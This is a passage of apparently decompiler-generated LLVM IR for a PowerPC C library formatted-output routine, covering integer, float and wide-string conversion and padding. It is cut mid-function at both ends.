dec_label_pc_10008904.dec_label_pc_10008904_crit_edge.dec_label_pc_10008904.dec_label_pc_10008904_crit_edge_crit_edge: ; preds = %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge
  %v1_10008904.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge

dec_label_pc_10008918:                            ; preds = %dec_label_pc_10008904.preheader, %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge, %dec_label_pc_1000890c.preheader.thread, %dec_label_pc_1000890c.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_1000891c, label %dec_label_pc_10008924, label %dec_label_pc_10008944

dec_label_pc_10008924:                            ; preds = %dec_label_pc_10008918
  %v0_10008928 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10008928, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_10008928, 0
  %v1_10008930 = zext i1 %tmp96 to i32
  %v2_10008930 = ashr i32 %v0_10008928, 31
  %v3_10008930 = and i32 %v2_10008930, -2
  %v4_10008930 = or i32 %v3_10008930, %v1_10008930
  store i32 %v4_10008930, i32* @r5, align 4
  %v1_10008938 = call i32 @__asm_rlwinm(i32 %v0_10008a58, i32 0, i32 20, i32 23)
  store i32 %v1_10008938, i32* @r4, align 4
  %v1_1000893c = inttoptr i32 %v1_10008938 to i16*
  %v2_1000893c = call i32 @_store_inttype(i16* %v1_1000893c)
  br label %dec_label_pc_10008e00

dec_label_pc_10008944:                            ; preds = %dec_label_pc_10008918
  br i1 %v2_10008944, label %dec_label_pc_10008b24, label %dec_label_pc_1000894c

dec_label_pc_1000894c:                            ; preds = %dec_label_pc_10008944
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1000895c = load i8, i8* %v2_1000895c, align 1
  %v4_1000895c = zext i8 %v3_1000895c to i32
  store i32 %v4_1000895c, i32* %r30.global-to-local, align 4
  %v3_10008960 = icmp eq i8 %v3_1000895c, 10
  br i1 %v3_10008960, label %dec_label_pc_10008968, label %dec_label_pc_10008990

dec_label_pc_10008968:                            ; preds = %dec_label_pc_1000894c
  store i32 %v0_10008a58, i32* %r0.global-to-local, align 4
  %v1_1000896c = call i32 @__asm_rlwinm(i32 %v0_10008a58, i32 26, i32 31, i32 31)
  %v1_10008970 = call i32 @__asm_rlwinm(i32 %v0_10008a58, i32 27, i32 31, i32 31)
  %v3_10008974 = icmp eq i32 %v1_1000896c, 0
  %v2_10008978 = icmp ne i32 %v1_10008970, 0
  %not.v2_10008978 = xor i1 %v2_10008978, true
  %v6_1000897c = sext i1 %not.v2_10008978 to i32
  store i32 %v6_1000897c, i32* %r0.global-to-local, align 4
  %v1_10008984 = select i1 %v2_10008978, i32 44, i32 87
  store i32 %v1_10008984, i32* %r31.global-to-local, align 4
  br i1 %v3_10008974, label %dec_label_pc_10008990, label %dec_label_pc_1000898c

dec_label_pc_1000898c:                            ; preds = %dec_label_pc_10008968
  %v1_1000898c = or i32 %v1_10008984, 128
  store i32 %v1_1000898c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008990

dec_label_pc_10008990:                            ; preds = %dec_label_pc_1000894c, %dec_label_pc_10008968, %dec_label_pc_1000898c
  %v0_10008990 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008990 = icmp ugt i32 %v0_10008990, 5
  br i1 %v2_10008990, label %dec_label_pc_100089b8, label %dec_label_pc_10008998

dec_label_pc_10008998:                            ; preds = %dec_label_pc_10008990
  %v3_10008998 = icmp eq i32 %v0_10008990, 3
  br i1 %v3_10008998, label %dec_label_pc_100089a0, label %dec_label_pc_100089a8

dec_label_pc_100089a0:                            ; preds = %dec_label_pc_10008998
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100089bc

dec_label_pc_100089a8:                            ; preds = %dec_label_pc_10008998
  %v3_100089a8 = icmp eq i32 %v0_10008990, 1
  br i1 %v3_100089a8, label %dec_label_pc_100089c0, label %dec_label_pc_100089bc

dec_label_pc_100089b8:                            ; preds = %dec_label_pc_10008990
  %v0_100089b8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100089b8 = sub i32 0, %v0_100089b8
  store i32 %v1_100089b8, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100089bc

dec_label_pc_100089bc:                            ; preds = %dec_label_pc_100089a8, %dec_label_pc_100089a0, %dec_label_pc_100089b8
  br label %dec_label_pc_100089c0

dec_label_pc_100089c0:                            ; preds = %dec_label_pc_100089a8, %dec_label_pc_100089bc
  %storemerge3 = phi i32 [ 11, %dec_label_pc_100089bc ], [ 6, %dec_label_pc_100089a8 ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_100089c0 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_100089c0, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_100089c0, -1
  br i1 %tmp75, label %dec_label_pc_100089d4, label %dec_label_pc_100089d0

dec_label_pc_100089d0:                            ; preds = %dec_label_pc_100089c0
  br label %dec_label_pc_100089d4

dec_label_pc_100089d4:                            ; preds = %dec_label_pc_100089c0, %dec_label_pc_100089d0
  %storemerge = phi i32 [ %v4_100089d0, %dec_label_pc_100089d0 ], [ 32, %dec_label_pc_100089c0 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_100089d4 = icmp eq i32 %v0_10008990, 1
  br i1 %v3_100089d4, label %dec_label_pc_100089f0, label %dec_label_pc_100089e0

dec_label_pc_100089e0:                            ; preds = %dec_label_pc_100089d4
  %v0_100089e0 = load i32, i32* @r7, align 4
  %v1_100089e0 = mul i32 %v0_100089e0, 4
  store i32 %v1_100089e0, i32* %r0.global-to-local, align 4
  %v0_100089e4 = load i32, i32* @r1, align 4
  %v2_100089e4 = add i32 %v0_100089e4, %v1_100089e0
  %v1_100089e8 = add i32 %v2_100089e4, 188
  %v2_100089e8 = inttoptr i32 %v1_100089e8 to i32*
  %v3_100089e8 = load i32, i32* %v2_100089e8, align 4
  store i32 %v3_100089e8, i32* %r0.global-to-local, align 4
  %v1_100089ec = call i32 @__asm_rlwinm(i32 %v3_100089e8, i32 0, i32 20, i32 23)
  br label %dec_label_pc_100089f0

dec_label_pc_100089f0:                            ; preds = %dec_label_pc_100089d4, %dec_label_pc_100089e0
  %v3_100089f0 = load i32, i32* %stack_var_-344, align 4
  %v0_100089f4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100089f4, i32* @r5, align 4
  %v2_100089f8 = inttoptr i32 %v0_100089f4 to i32*
  %v3_100089f8 = call i32 @_load_inttype(i32 %v3_100089f0, i32* %v2_100089f8)
  %v0_10008a08 = load i32, i32* %r31.global-to-local, align 4
  %v6_10008a10 = call i32 @_uintmaxtostr(i8* %v5_10008a10, i32 %v3_100089f8, i32 %v3_100089f0, i32 %v0_100089f4, i32 %v0_10008a08)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_10008a10, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_10008a64, label %dec_label_pc_10008a24

dec_label_pc_10008a24:                            ; preds = %dec_label_pc_100089f0
  %v7_10008a10 = inttoptr i32 %v6_10008a10 to i8*
  %v3_10008a24 = load i8, i8* %v7_10008a10, align 1
  %v4_10008a24 = zext i8 %v3_10008a24 to i32
  store i32 %v4_10008a24, i32* %r0.global-to-local, align 4
  %v3_10008a2c = icmp eq i8 %v3_10008a24, 45
  br i1 %v3_10008a2c, label %dec_label_pc_10008a34, label %dec_label_pc_10008a48

dec_label_pc_10008a34:                            ; preds = %dec_label_pc_10008a24
  %v1_10008a34 = or i32 %v0_10008a58, 2
  store i32 %v1_10008a34, i32* %r0.global-to-local, align 4
  %v2_10008a38 = add i32 %v6_10008a10, 1
  store i32 %v2_10008a38, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_10008a64

dec_label_pc_10008a48:                            ; preds = %dec_label_pc_10008a24
  %v1_10008a48 = and i32 %v0_10008a58, 2
  store i32 %v1_10008a48, i32* %r0.global-to-local, align 4
  %v3_10008a48 = icmp eq i32 %v1_10008a48, 0
  br i1 %v3_10008a48, label %dec_label_pc_10008a58, label %dec_label_pc_10008a50

dec_label_pc_10008a50:                            ; preds = %dec_label_pc_10008a48
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10008a64

dec_label_pc_10008a58:                            ; preds = %dec_label_pc_10008a48
  %v1_10008a58 = urem i32 %v0_10008a58, 2
  store i32 %v1_10008a58, i32* %r11.global-to-local, align 4
  %v3_10008a58 = icmp eq i32 %v1_10008a58, 0
  br i1 %v3_10008a58, label %dec_label_pc_10008a64, label %dec_label_pc_10008a60

dec_label_pc_10008a60:                            ; preds = %dec_label_pc_10008a58
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_10008a64

dec_label_pc_10008a64:                            ; preds = %dec_label_pc_10008a58, %dec_label_pc_100089f0, %dec_label_pc_10008a50, %dec_label_pc_10008a34, %dec_label_pc_10008a60
  %v0_10008ad0 = phi i32 [ %v6_10008a10, %dec_label_pc_100089f0 ], [ %v2_10008a38, %dec_label_pc_10008a34 ], [ %v6_10008a10, %dec_label_pc_10008a58 ], [ %v6_10008a10, %dec_label_pc_10008a60 ], [ %v6_10008a10, %dec_label_pc_10008a50 ]
  %stack_var_-184.0 = phi i32 [ %v0_10008a58, %dec_label_pc_100089f0 ], [ %v1_10008a34, %dec_label_pc_10008a34 ], [ %v0_10008a58, %dec_label_pc_10008a58 ], [ %v0_10008a58, %dec_label_pc_10008a60 ], [ %v0_10008a58, %dec_label_pc_10008a50 ]
  %v3_10008a64 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_10008c78, i32* %r0.global-to-local, align 4
  %v2_10008a6c = sub i32 %v2_10008c78, %v0_10008ad0
  %v1_10008a74 = add i32 %v2_10008a6c, 127
  store i32 %v1_10008a74, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_10008a64, -1
  br i1 %tmp76, label %dec_label_pc_10008a80, label %dec_label_pc_10008a7c

dec_label_pc_10008a7c:                            ; preds = %dec_label_pc_10008a64
  br label %dec_label_pc_10008a80

dec_label_pc_10008a80:                            ; preds = %dec_label_pc_10008a64, %dec_label_pc_10008a7c
  %v0_10008ab4 = phi i32 [ %v3_10008a64, %dec_label_pc_10008a64 ], [ 1, %dec_label_pc_10008a7c ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_10008a84 = and i32 %stack_var_-184.0, 16
  store i32 %v1_10008a84, i32* %r11.global-to-local, align 4
  %v3_10008a84 = icmp eq i32 %v1_10008a84, 0
  br i1 %v3_10008a84, label %dec_label_pc_10008ad0, label %dec_label_pc_10008a8c

dec_label_pc_10008a8c:                            ; preds = %dec_label_pc_10008a80
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10008a90, label %dec_label_pc_10008a9c, label %dec_label_pc_10008aac.thread

dec_label_pc_10008aac.thread:                     ; preds = %dec_label_pc_10008a8c
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_10008ad0

dec_label_pc_10008a9c:                            ; preds = %dec_label_pc_10008a8c
  br i1 %v3_10008a9c, label %dec_label_pc_10008aa4, label %dec_label_pc_10008aac

dec_label_pc_10008aa4:                            ; preds = %dec_label_pc_10008a9c
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_10008ad0

dec_label_pc_10008aac:                            ; preds = %dec_label_pc_10008a9c
  br i1 %v3_10008aac, label %dec_label_pc_10008ab4, label %dec_label_pc_10008ad0

dec_label_pc_10008ab4:                            ; preds = %dec_label_pc_10008aac
  %v3_10008ab4 = icmp ugt i32 %v0_10008ab4, %v1_10008a74
  br i1 %v3_10008ab4, label %dec_label_pc_10008ad0, label %dec_label_pc_10008abc

dec_label_pc_10008abc:                            ; preds = %dec_label_pc_10008ab4
  %v1_10008abc = inttoptr i32 %v0_10008ad0 to i8*
  %v2_10008abc = load i8, i8* %v1_10008abc, align 1
  %v3_10008abc = zext i8 %v2_10008abc to i32
  store i32 %v3_10008abc, i32* %r0.global-to-local, align 4
  %v3_10008ac4 = icmp eq i8 %v2_10008abc, 48
  br i1 %v3_10008ac4, label %dec_label_pc_10008ad0, label %dec_label_pc_10008acc

dec_label_pc_10008acc:                            ; preds = %dec_label_pc_10008abc
  %v1_10008acc = add i32 %v2_10008a6c, 128
  br label %dec_label_pc_10008ad0

dec_label_pc_10008ad0:                            ; preds = %dec_label_pc_10008aac.thread, %dec_label_pc_10008aac, %dec_label_pc_10008abc, %dec_label_pc_10008ab4, %dec_label_pc_10008a80, %dec_label_pc_10008aa4, %dec_label_pc_10008acc
  %v1_10008b18 = phi i32 [ %v0_10008ab4, %dec_label_pc_10008aac ], [ 1, %dec_label_pc_10008abc ], [ %v0_10008ab4, %dec_label_pc_10008ab4 ], [ %v0_10008ab4, %dec_label_pc_10008a80 ], [ %v0_10008ab4, %dec_label_pc_10008aa4 ], [ %v1_10008acc, %dec_label_pc_10008acc ], [ %v0_10008ab4, %dec_label_pc_10008aac.thread ]
  %v1_10008ad0 = inttoptr i32 %v0_10008ad0 to i8*
  %v2_10008ad0 = load i8, i8* %v1_10008ad0, align 1
  %v3_10008ad0 = zext i8 %v2_10008ad0 to i32
  store i32 %v3_10008ad0, i32* %r0.global-to-local, align 4
  %v3_10008ad4 = icmp eq i8 %v2_10008ad0, 48
  br i1 %v3_10008ad4, label %dec_label_pc_10008adc, label %dec_label_pc_10008b14

dec_label_pc_10008adc:                            ; preds = %dec_label_pc_10008ad0
  %v0_10008adc = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_10008adc, 6
  br i1 %tmp77, label %dec_label_pc_10008ae8, label %dec_label_pc_10008ae4

dec_label_pc_10008ae4:                            ; preds = %dec_label_pc_10008adc
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_10008ae8

dec_label_pc_10008ae8:                            ; preds = %dec_label_pc_10008adc, %dec_label_pc_10008ae4
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_10008aec, label %dec_label_pc_10008af4, label %dec_label_pc_10008b04

dec_label_pc_10008af4:                            ; preds = %dec_label_pc_10008ae8
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10012920.578 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008c90

dec_label_pc_10008b04:                            ; preds = %dec_label_pc_10008ae8
  %v3_10008b04 = icmp eq i32 %v1_10008b18, 0
  br i1 %v3_10008b04, label %dec_label_pc_10008b0c, label %dec_label_pc_10008b14

dec_label_pc_10008b0c:                            ; preds = %dec_label_pc_10008b04
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008c90

dec_label_pc_10008b14:                            ; preds = %dec_label_pc_10008b04, %dec_label_pc_10008ad0
  %v3_10008b14 = icmp ugt i32 %v1_10008b18, %v1_10008a74
  %v2_10008b18 = sub i32 %v1_10008b18, %v1_10008a74
  store i32 %v2_10008b18, i32* %r29.global-to-local, align 4
  br i1 %v3_10008b14, label %dec_label_pc_10008cb0thread-pre-split, label %dec_label_pc_10008c90

dec_label_pc_10008b24:                            ; preds = %dec_label_pc_10008944
  br i1 %v2_10008b24, label %dec_label_pc_10008b58, label %dec_label_pc_10008b2c

dec_label_pc_10008b2c:                            ; preds = %dec_label_pc_10008b24
  %v3_10008b2c = load i32, i32* %stack_var_-344, align 4
  %v0_10008b38 = load i32, i32* %r24.global-to-local, align 4
  store i32 268471112, i32* @lr, align 4
  %v5_10008b44 = call i32 @_fpmaxtostr(i32 %v0_10008b38, i32* nonnull %stack_var_-196, i32 add (i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 -30944), i32 %v3_10008b2c)
  %v1_10008b48 = icmp slt i32 %v5_10008b44, 0
  br i1 %v1_10008b48, label %dec_label_pc_10008e14, label %dec_label_pc_10008b50

dec_label_pc_10008b50:                            ; preds = %dec_label_pc_10008b2c
  %v0_10008b50 = load i32, i32* %r23.global-to-local, align 4
  %v2_10008b50 = add i32 %v0_10008b50, %v5_10008b44
  store i32 %v2_10008b50, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10008e00

dec_label_pc_10008b58:                            ; preds = %dec_label_pc_10008b24
  br i1 %v2_10008b58, label %dec_label_pc_10008c00, label %dec_label_pc_10008b60

dec_label_pc_10008b60:                            ; preds = %dec_label_pc_10008b58
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_10008b6c = load i32, i32* %stack_var_-344, align 4
  %v1_10008b74 = inttoptr i32 %v3_10008b6c to i32*
  %v2_10008b74 = load i32, i32* %v1_10008b74, align 4
  br i1 %v3_10008b58, label %dec_label_pc_10008b74, label %dec_label_pc_10008bc8

dec_label_pc_10008b74:                            ; preds = %dec_label_pc_10008b60
  store i32 %v2_10008b74, i32* %r0.global-to-local, align 4
  %v3_10008b78 = icmp eq i32 %v2_10008b74, 0
  store i32 %v2_10008b74, i32* %stack_var_-340, align 4
  br i1 %v3_10008b78, label %dec_label_pc_10008c98, label %dec_label_pc_10008b84

dec_label_pc_10008b84:                            ; preds = %dec_label_pc_10008b74
  %v3_10008b84 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10008b84, i32* %r0.global-to-local, align 4
  %v1_10008b8c = icmp slt i32 %v3_10008b84, 0
  br i1 %v1_10008b8c, label %dec_label_pc_10008b98, label %dec_label_pc_10008b94

dec_label_pc_10008b94:                            ; preds = %dec_label_pc_10008b84
  br label %dec_label_pc_10008b98

dec_label_pc_10008b98:                            ; preds = %dec_label_pc_10008b84, %dec_label_pc_10008b94
  %storemerge94 = phi i32 [ %v3_10008b84, %dec_label_pc_10008b94 ], [ -1, %dec_label_pc_10008b84 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_10008b98, i32* @r3, align 4
  store i32 %v2_10008b9c, i32* @r6, align 4
  store i32 %v2_10008b98, i32* @r4, align 4
  store i32 268471208, i32* @lr, align 4
  %v0_10008ba4 = call i32 @__GI_wcsrtombs()
  %v3_10008ba8 = icmp eq i32 %v0_10008ba4, -1
  store i32 %v0_10008ba4, i32* @r31, align 4
  br i1 %v3_10008ba8, label %dec_label_pc_10008e14, label %dec_label_pc_10008bb4

dec_label_pc_10008bb4:                            ; preds = %dec_label_pc_10008b98
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008cb0

dec_label_pc_10008bc8:                            ; preds = %dec_label_pc_10008b60
  store i32 %v2_10008c78, i32* @r28, align 4
  store i32 268471260, i32* @lr, align 4
  %v3_10008bd8 = call i32 @__GI_wcrtomb(i32 %v2_10008c78, i32 %v2_10008b74, i32 %v2_10008b9c)
  %v3_10008bdc = icmp eq i32 %v3_10008bd8, -1
  store i32 %v3_10008bd8, i32* @r31, align 4
  br i1 %v3_10008bdc, label %dec_label_pc_10008e14, label %dec_label_pc_10008be8

dec_label_pc_10008be8:                            ; preds = %dec_label_pc_10008bc8
  store i32 %v2_10008c78, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_10008bf8 = load i32, i32* @r25, align 4
  %v1_10008bf8 = load i32, i32* @r28, align 4
  %v3_10008bf8 = trunc i32 %v0_10008bf8 to i8
  %v4_10008bf8 = add i32 %v1_10008bf8, %v3_10008bd8
  %v5_10008bf8 = inttoptr i32 %v4_10008bf8 to i8*
  store i8 %v3_10008bf8, i8* %v5_10008bf8, align 1
  %v0_10008cb4.pre.pre = load i32, i32* @r31, align 4
  %v1_10008cb4.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008cb0thread-pre-split

dec_label_pc_10008c00:                            ; preds = %dec_label_pc_10008b58
  br i1 %v2_10008c00, label %dec_label_pc_10008c6c, label %dec_label_pc_10008c08

dec_label_pc_10008c08:                            ; preds = %dec_label_pc_10008c00
  %v3_10008c0c = load i32, i32* %stack_var_-344, align 4
  %v1_10008c14 = inttoptr i32 %v3_10008c0c to i32*
  %v2_10008c14 = load i32, i32* %v1_10008c14, align 4
  br i1 %v3_10008c00, label %dec_label_pc_10008c14, label %dec_label_pc_10008c44

dec_label_pc_10008c14:                            ; preds = %dec_label_pc_10008c08
  store i32 %v2_10008c14, i32* %r30.global-to-local, align 4
  %v3_10008c18 = icmp eq i32 %v2_10008c14, 0
  br i1 %v3_10008c18, label %dec_label_pc_10008c98, label %dec_label_pc_10008c20

dec_label_pc_10008c20:                            ; preds = %dec_label_pc_10008c14, %dec_label_pc_10008c74
  %v0_10008c34 = phi i32 [ %v2_10008c14, %dec_label_pc_10008c14 ], [ %v3_10008c84, %dec_label_pc_10008c74 ]
  %v3_10008c20 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10008c20, i32* %r0.global-to-local, align 4
  %v1_10008c28 = icmp slt i32 %v3_10008c20, 0
  br i1 %v1_10008c28, label %dec_label_pc_10008c34, label %dec_label_pc_10008c30

dec_label_pc_10008c30:                            ; preds = %dec_label_pc_10008c20
  br label %dec_label_pc_10008c34

dec_label_pc_10008c34:                            ; preds = %dec_label_pc_10008c20, %dec_label_pc_10008c30
  %storemerge95 = phi i32 [ %v3_10008c20, %dec_label_pc_10008c30 ], [ -1, %dec_label_pc_10008c20 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268471356, i32* @lr, align 4
  %v1_10008c38 = inttoptr i32 %v0_10008c34 to i8*
  %v2_10008c38 = call i32 @strnlen(i8* %v1_10008c38)
  store i32 %v2_10008c38, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008ca4

dec_label_pc_10008c44:                            ; preds = %dec_label_pc_10008c08
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_10008c14, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_10008c78, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008cb0thread-pre-split

dec_label_pc_10008c6c:                            ; preds = %dec_label_pc_10008c00
  br i1 %v3_10008c6c, label %dec_label_pc_10008c74, label %dec_label_pc_10008e14

dec_label_pc_10008c74:                            ; preds = %dec_label_pc_10008c6c
  %v0_10008c74 = call i32 @__errno_location()
  %v1_10008c7c = inttoptr i32 %v0_10008c74 to i32*
  %v2_10008c7c = load i32, i32* %v1_10008c7c, align 4
  store i32 %v2_10008c7c, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268471432, i32* @lr, align 4
  %v3_10008c84 = call i32 @__GI___glibc_strerror_r(i32 %v2_10008c7c, i32 %v2_10008c78, i32 128)
  store i32 %v3_10008c84, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008c20

dec_label_pc_10008c90:                            ; preds = %dec_label_pc_10008b14, %dec_label_pc_10008b0c, %dec_label_pc_10008af4
  %v0_10008cb4.pre41 = phi i32 [ %v1_10008a74, %dec_label_pc_10008b14 ], [ 0, %dec_label_pc_10008b0c ], [ 5, %dec_label_pc_10008af4 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008cb0thread-pre-split

dec_label_pc_10008c98:                            ; preds = %dec_label_pc_10008c14, %dec_label_pc_10008b74
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10012928.579 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008ca4

dec_label_pc_10008ca4:                            ; preds = %dec_label_pc_10008c34, %dec_label_pc_10008c98
  %v0_10008cb429 = phi i32 [ %v2_10008c38, %dec_label_pc_10008c34 ], [ 6, %dec_label_pc_10008c98 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_10008cb0

dec_label_pc_10008cb0thread-pre-split:            ; preds = %dec_label_pc_10008be8, %dec_label_pc_10008c44, %dec_label_pc_10008c90, %dec_label_pc_10008b14
  %v1_10008cb4.pre = phi i32 [ %v2_10008b18, %dec_label_pc_10008b14 ], [ 0, %dec_label_pc_10008c90 ], [ %v1_10008cb4.pre.pre, %dec_label_pc_10008be8 ], [ 0, %dec_label_pc_10008c44 ]
  %v0_10008cb4.pre = phi i32 [ %v1_10008a74, %dec_label_pc_10008b14 ], [ %v0_10008cb4.pre41, %dec_label_pc_10008c90 ], [ %v0_10008cb4.pre.pre, %dec_label_pc_10008be8 ], [ 1, %dec_label_pc_10008c44 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_10008b14 ], [ %stack_var_-184.0, %dec_label_pc_10008c90 ], [ %v0_10008a58, %dec_label_pc_10008be8 ], [ %v0_10008a58, %dec_label_pc_10008c44 ]
  %v0_10008cb0.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10008cb0

dec_label_pc_10008cb0:                            ; preds = %dec_label_pc_10008cb0thread-pre-split, %dec_label_pc_10008bb4, %dec_label_pc_10008ca4
  %v1_10008cb4 = phi i32 [ %v1_10008cb4.pre, %dec_label_pc_10008cb0thread-pre-split ], [ 0, %dec_label_pc_10008bb4 ], [ 0, %dec_label_pc_10008ca4 ]
  %v0_10008cb4 = phi i32 [ %v0_10008cb4.pre, %dec_label_pc_10008cb0thread-pre-split ], [ %v0_10008ba4, %dec_label_pc_10008bb4 ], [ %v0_10008cb429, %dec_label_pc_10008ca4 ]
  %v0_10008cbc = phi i32 [ %v0_10008cb0.pr, %dec_label_pc_10008cb0thread-pre-split ], [ 11, %dec_label_pc_10008bb4 ], [ 11, %dec_label_pc_10008ca4 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10008cb0thread-pre-split ], [ %v0_10008a58, %dec_label_pc_10008bb4 ], [ %v0_10008a58, %dec_label_pc_10008ca4 ]
  %v3_10008cb0 = icmp eq i32 %v0_10008cbc, 11
  %v2_10008cb4 = add i32 %v0_10008cb4, %v1_10008cb4
  store i32 %v2_10008cb4, i32* %r0.global-to-local, align 4
  br i1 %v3_10008cb0, label %dec_label_pc_10008cd0, label %dec_label_pc_10008cbc

dec_label_pc_10008cbc:                            ; preds = %dec_label_pc_10008cb0
  %v0_10008cc0 = call i32 @__asm_mfcr()
  %v1_10008cc4 = call i32 @__asm_rlwinm(i32 %v0_10008cc0, i32 30, i32 31, i32 31)
  %v1_10008cc8 = add i32 %v1_10008cc4, 1
  %v0_10008ccc = load i32, i32* %r0.global-to-local, align 4
  %v2_10008ccc = add i32 %v0_10008ccc, %v1_10008cc8
  store i32 %v2_10008ccc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008cd0

dec_label_pc_10008cd0:                            ; preds = %dec_label_pc_10008cb0, %dec_label_pc_10008cbc
  %v0_10008ce8 = phi i32 [ %v2_10008cb4, %dec_label_pc_10008cb0 ], [ %v2_10008ccc, %dec_label_pc_10008cbc ]
  %v3_10008cd8 = icmp ugt i32 %tmp, %v0_10008ce8
  br i1 %v3_10008cd8, label %dec_label_pc_10008ce0, label %dec_label_pc_10008ce4

dec_label_pc_10008ce0:                            ; preds = %dec_label_pc_10008cd0
  %v2_10008ce0 = sub i32 %tmp, %v0_10008ce8
  br label %dec_label_pc_10008ce4

dec_label_pc_10008ce4:                            ; preds = %dec_label_pc_10008cd0, %dec_label_pc_10008ce0
  %storemerge93 = phi i32 [ %v2_10008ce0, %dec_label_pc_10008ce0 ], [ 0, %dec_label_pc_10008cd0 ]
  %v1_10008cf4 = phi i32 [ %v2_10008ce0, %dec_label_pc_10008ce0 ], [ 0, %dec_label_pc_10008cd0 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_10008ce4 = load i32, i32* @r26, align 4
  %v3_10008ce4 = icmp eq i32 %v0_10008ce4, 48
  %v2_10008ce8 = add i32 %v1_10008cf4, %v0_10008ce8
  store i32 %v2_10008ce8, i32* %r0.global-to-local, align 4
  %v0_10008cec = load i32, i32* %r23.global-to-local, align 4
  %v2_10008cec = add i32 %v0_10008cec, %v2_10008ce8
  store i32 %v2_10008cec, i32* %r23.global-to-local, align 4
  br i1 %v3_10008ce4, label %dec_label_pc_10008cf4, label %dec_label_pc_10008cfc

dec_label_pc_10008cf4:                            ; preds = %dec_label_pc_10008ce4
  %v0_10008cf4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10008cf4 = add i32 %v0_10008cf4, %v1_10008cf4
  store i32 %v2_10008cf4, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10008cfc

dec_label_pc_10008cfc:                            ; preds = %dec_label_pc_10008ce4, %dec_label_pc_10008cf4
  %v0_10008d10 = phi i32 [ %v1_10008cf4, %dec_label_pc_10008ce4 ], [ 0, %dec_label_pc_10008cf4 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10008d00 = and i32 %stack_var_-184.1, 8
  %v3_10008d00 = icmp eq i32 %v1_10008d00, 0
  br i1 %v3_10008d00, label %dec_label_pc_10008d08, label %dec_label_pc_10008d24

dec_label_pc_10008d08:                            ; preds = %dec_label_pc_10008cfc
  %v0_10008d08 = load i32, i32* %r24.global-to-local, align 4
  store i32 268471576, i32* @lr, align 4
  %v4_10008d14 = call i32 @_charpad(i32 %v0_10008d08, i8 32, i32 %v0_10008d10)
  %v1_10008d18 = load i32, i32* @r28, align 4
  %v4_10008d18 = icmp eq i32 %v4_10008d14, %v1_10008d18
